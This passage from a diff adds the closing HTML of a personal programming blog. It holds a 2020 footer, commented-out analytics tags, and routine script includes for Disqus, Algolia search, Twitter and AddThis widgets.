+    <!-- <img src="//data.uxeranalytics.com/image1.png?uxa=blog" id="pxl1"> -->
+    <!-- <script async defer src="//data.uxeranalytics.com/uxa.js"></script> -->
+    <!-- /uxa -->
+
+    <footer class="page-footer">
+      <div class="container">
+        <div class="p-y-2">
+          &copy; 2020 <a href="http://adrianmejia.com">Adrian Mejia</a>
+          <span class="muted m-x-4" title="Mon Aug 31 2020 16:22:15 GMT-0400 (Eastern Daylight Time)">
+            v.qfy393
+          </span>
+        </div>
+      </div>
+    </footer>
+
+    <!-- Scripts -->
+    
+<script src="/js/main.babel.js"></script>
+    <script id="dsq-count-scr" src="//adrianmejia.disqus.com/count.js" async></script>
+    <!-- Algolia Search -->
+    <link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/instantsearch.js/1/instantsearch.min.css" />
+    <script src="//cdn.jsdelivr.net/instantsearch.js/1/instantsearch.min.js"></script>
+    
+<link rel="stylesheet" href="/stylesheets/55_search.css">
+
+
+
+    <!-- social scripts -->
+    <script async defer src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+    
+
+    
+      <!-- <script src="https://gumroad.com/js/gumroad.js"></script> -->
+
+      <!-- adthis -->
+      <script type="text/javascript">
+        var addthis_config = {
+          data_ga_property: 'UA-24183929-4',
+          data_ga_social : true
+        };
+      </script>
+      <script async defer type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-579cb31b46e2f7e6"></script>
+
+      
+<script src="/js/posts.babel.js"></script>
+      
+<script src="/js/posts2.babel.js"></script>
+    
+  </body>
+</html>
